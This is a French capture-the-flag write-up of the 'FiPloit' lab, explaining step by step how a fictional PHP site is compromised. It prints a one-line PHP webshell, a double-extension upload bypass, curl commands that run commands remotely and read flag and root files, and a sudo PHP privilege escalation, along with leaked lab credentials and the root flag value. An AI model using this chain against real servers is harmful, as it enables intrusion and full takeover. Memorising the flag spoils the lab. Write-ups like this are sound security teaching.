# FiPloit — HackerDNA | Write-up

**Plateforme:** FiPloitLab  
**Difficulte:** Facile  
**Points:** 20  
**Flags:** 2  
**Taux de reussite global:** 25%  
**Auteur:** doacyber  

---

## Introduction

Ce lab simule une application web PHP vulnerables qui tourne dans un environnement de type entreprise fictive appele **SecureCorp**.

L'objectif est de compromettre le serveur en obtenant deux flags :
- Un flag utilisateur (user flag)
- Un flag root (privilege maximum)

Les techniques utilisees dans ce lab :
- Decouverte de service sur port non standard
- Enumeration de fichiers et repertoires
- Divulgation d'informations sensibles
- Contournement de validation d'upload de fichiers
- Execution de code a distance (RCE)
- Escalade de privileges via mauvaise configuration sudo

---

## Etape 1 — Decouverte du service web

La premiere chose que j'ai faite c'est d'acceder a la cible dans le navigateur via le port HTTP classique :

```
http://TARGET_IP
```

La page ne chargeait pas. Apres avoir teste manuellement, j'ai trouve que l'application tournait sur le **port 8080** :

```
http://TARGET_IP:8080
```

Dans un vrai pentest, j'aurais utilise nmap pour scanner tous les ports :

```bash
nmap -sC -sV -p- TARGET_IP
```

- `-sC` : lance les scripts de detection par defaut
- `-sV` : detecte les versions des services
- `-p-` : scanne tous les 65535 ports

---

## Etape 2 — Enumeration des fichiers et repertoires

Une fois sur l'application, j'ai lance **Gobuster** pour decouvrir des fichiers ou repertoires caches que les developpeurs auraient pu laisser :

```bash
gobuster dir -u http://TARGET_IP:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -x txt,php,log,bak
```

- `dir` : mode enumeration de repertoires
- `-u` : l'URL cible
- `-w` : la wordlist utilisee pour bruteforcer les noms
- `-x` : extensions a tester en plus (txt, php, log, bak)

**Resultats interessants trouves :**

```
/notes.txt
/upload_log_temp4.php
```

---

## Etape 3 — Divulgation d'informations sensibles

J'ai ouvert le fichier `notes.txt` directement dans le navigateur :

```
http://TARGET_IP:8080/notes.txt
```

Le fichier contenait des notes internes de developpeur :

```
Remove /upload_log_temp4.php before prod
Database creds: root:Password123!
Fix contact form
Disable debug
```

Ce type de fichier oublie sur un serveur de production est ce qu'on appelle de la **divulgation d'informations sensibles (Information Disclosure)**.

Deux informations cles recuperees :
- Des identifiants de base de donnees en clair
- L'existence d'un endpoint d'upload non supprime : `/upload_log_temp4.php`

---

## Etape 4 — Exploration de la page d'upload

En accedant a la page :

```
http://TARGET_IP:8080/upload_log_temp4.php
```

J'ai trouve un formulaire qui permettait d'uploader des fichiers, mais uniquement avec l'extension `.txt`.

Quand j'ai essaye d'uploader directement un fichier PHP nomme `shell.php`, l'upload etait refuse.

---

## Etape 5 — Contournement de la validation (File Upload Bypass)

Apres analyse du comportement de l'application, j'ai compris que la validation ne verifiait pas que le fichier **se terminait** par `.txt`, mais seulement que `.txt` etait **present quelque part** dans le nom du fichier.

J'ai donc nomme mon fichier :

```
shell.txt.php
```

Le serveur Apache/PHP interprete la **derniere extension** comme type de fichier. Donc :
- La validation voit `.txt` → elle accepte le fichier
- Le serveur voit `.php` → il execute le fichier comme du PHP

C'est une vulnerabilite classique appelee **Improper File Extension Validation**.

Le contenu du fichier uploade :

```php
<?php system($_GET['cmd']); ?>
```

Ce code PHP execute n'importe quelle commande passee dans le parametre `cmd` de l'URL.

---

## Etape 6 — Execution de code a distance (RCE)

Une fois l'upload reussi, il fallait trouver ou le fichier avait ete depose sur le serveur.

**Reflexe important :** quand un formulaire PHP accepte un upload, le fichier est presque toujours stocke dans un dossier `/uploads/`. C'est la convention la plus courante.

J'ai donc teste directement :

```
http://TARGET_IP:8080/uploads/shell.txt.php?cmd=whoami
```

- `uploads/` : dossier standard ou les fichiers uploades sont stockes
- `shell.txt.php` : mon fichier uploade
- `?cmd=whoami` : la commande que je veux executer sur le serveur

Le serveur a retourne :

```
ctf
```

L'execution de code a distance etait confirmee. J'avais le controle du serveur en tant qu'utilisateur `ctf`.

**Note sur les `+` dans l'URL :** Les espaces sont interdits dans les URLs. Le `+` est l'encodage d'un espace dans les parametres GET. Donc `cmd=sudo+ls` est lu par le serveur comme `sudo ls`.

---

## Etape 7 — Recuperation du flag utilisateur

Avec le RCE confirme, j'ai enumere le systeme via curl depuis mon terminal :

```bash
curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=ls+/home"
```

- `curl` : outil pour faire des requetes HTTP depuis le terminal
- `ls+/home` : liste le contenu du dossier /home (les + sont des espaces)

J'ai decouvert le dossier `/home/ctf`. J'ai ensuite lu le flag :

```bash
curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=cat+/home/ctf/flag-user.txt"
```

**User flag obtenu.**

---

## Etape 8 — Enumeration des privileges sudo

Pour chercher comment escalader les privileges vers root, j'ai verifie ce que l'utilisateur `ctf` avait le droit de faire en tant que root :

```bash
curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=sudo+-l"
```

- `sudo -l` : affiche la liste des commandes que l'utilisateur peut executer avec sudo

Resultat :

```
User ctf may run the following commands on ip-10-0-3-91:
    (ALL) NOPASSWD: /bin/ls, /usr/bin/file, /usr/bin/php
```

L'utilisateur `ctf` peut executer **PHP en tant que root sans mot de passe**. C'est une misconfiguration critique.

---

## Etape 9 — Escalade de privileges vers root

`sudo cat` n'etait pas dans la liste des commandes autorisees, donc je ne pouvais pas lire directement `/root/root.txt` avec cat.

Mais PHP etait autorise. J'ai utilise une fonction PHP pour lire le fichier a la place de cat :

```bash
curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=sudo+php+-r+%22echo+file_get_contents('/root/flag-root.txt');%22"
```

Decomposition de la commande :

- `sudo` : execute en tant que root
- `php -r` : execute du code PHP directement en ligne de commande sans creer de fichier
- `echo` : affiche le resultat a l'ecran
- `file_get_contents('/root/flag-root.txt')` : fonction PHP qui lit le contenu d'un fichier
- `%22` et `%27` : encodage URL des guillemets `"` et `'`

**Root flag obtenu :**

```
739eabe6-3085-4852-beb2-1d0da7eb1973
```

---

## Chaine d'exploitation complete

```
Port 8080 decouvert
        |
Enumeration avec Gobuster
        |
notes.txt trouve → credentials + endpoint upload
        |
Upload de shell.txt.php (bypass double extension)
        |
RCE via ?cmd= dans l'URL
        |
User flag obtenu (/home/ctf/flag-user.txt)
        |
sudo -l → PHP autorise sans mot de passe
        |
sudo php -r file_get_contents() → lecture de /root/flag-root.txt
        |
Root flag obtenu
```

---

## Difficultes rencontrees

### 1. Trouver le dossier uploads

Apres avoir uploade le fichier avec succes, la page ne donnait aucune indication sur l'endroit ou le fichier avait ete stocke. Je ne savais pas qu'il fallait aller chercher dans `/uploads/`.

**Lecon retenue :** quand un upload reussit sur une appli PHP, le reflexe est de tester `/uploads/nom_du_fichier` en premier. Si ca ne marche pas, relancer gobuster apres l'upload pour decouvrir le nouveau repertoire.

### 2. Les guillemets dans l'URL

Quand j'ai essaye d'executer `sudo php -r '...'` directement dans le navigateur, ca ne fonctionnait pas a cause des guillemets simples qui sont mal interpretes dans les URLs.

**Solution :** utiliser `curl` depuis le terminal avec les guillemets encodes en URL (`%22` pour `"` et `%27` pour `'`).

### 3. cat bloque par sudo

Je pensais pouvoir lire le flag root avec `sudo cat /root/flag-root.txt` mais `cat` n'etait pas dans la liste sudo. Il a fallu trouver une alternative avec PHP et `file_get_contents()`.

---

## Vulnerabilites identifiees

| Vulnerabilite | Localisation | Impact |
|---|---|---|
| Information Disclosure | /notes.txt | Credentials et endpoints exposes |
| File Upload Bypass | /upload_log_temp4.php | Upload de webshell PHP |
| Remote Code Execution | /uploads/shell.txt.php | Controle total du serveur |
| Sudo Misconfiguration | /etc/sudoers | Escalade vers root |

---

## Conclusion

Ce lab illustre parfaitement comment plusieurs petites vulnerabilites peuvent se combiner pour compromettre un systeme entierement. Aucune de ces failles n'est spectaculaire isolement, mais enchainees, elles permettent de passer de zero a root.

Le point le plus important de ce lab : **comprendre le raisonnement derriere chaque etape**, pas juste executer des commandes.

---

*Write-up realise par [doacyber](https://github.com/doacyber)*
